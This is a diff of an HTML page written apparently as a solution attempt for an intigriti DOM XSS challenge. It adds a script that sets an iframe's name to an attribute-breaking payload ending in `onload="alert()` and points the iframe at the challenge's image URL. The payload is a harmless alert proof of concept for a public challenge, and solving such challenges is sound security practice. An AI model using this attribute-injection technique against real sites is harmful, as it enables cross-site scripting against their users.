@@ -1,20 +1,23 @@
 <html lang="en">
+        <head>
+                <meta charset="utf-8">
+  <title>intigriti DOM XSS challenge</title>
+  <style>
+    iframe{
+      position: absolute;
+      left : 0;
+      top : 0;
+      width : 100vw;
+      height : 100vh;
+    }
+  </style>
+        </head>
 <body>
-<!--     <script>
-        var iframe = document.createElement("iframe");
-//         iframe.id = `6666`;
-        iframe.name = `helloworld"onload="alert()`; 
-        iframe.src = `https://challenge.intigriti.io/static/4/challenge1.png?`
-        //iframe.src = `https://challenge.intigriti.io/static/4/challenge.png?q=alert(2)`;
-        document.body.appendChild(iframe);
-    </script> -->
     <script>
-        (location.search == "") ? true : location = location.pathname;
         var iframe = document.createElement("iframe");
-        var id = location.hash.substr(1);
-        var path = `/testpath`;
-        iframe.name = `helloworld`; 
-        iframe.src = path;
+        iframe.name = `helloworld"onload="alert()`; 
+        iframe.src = `https://challenge.intigriti.io/static/4/challenge.png?`
+        //iframe.src = `https://challenge.intigriti.io/static/4/challenge.png?q=alert(2)`;
         document.body.appendChild(iframe);
     </script>
     <script>
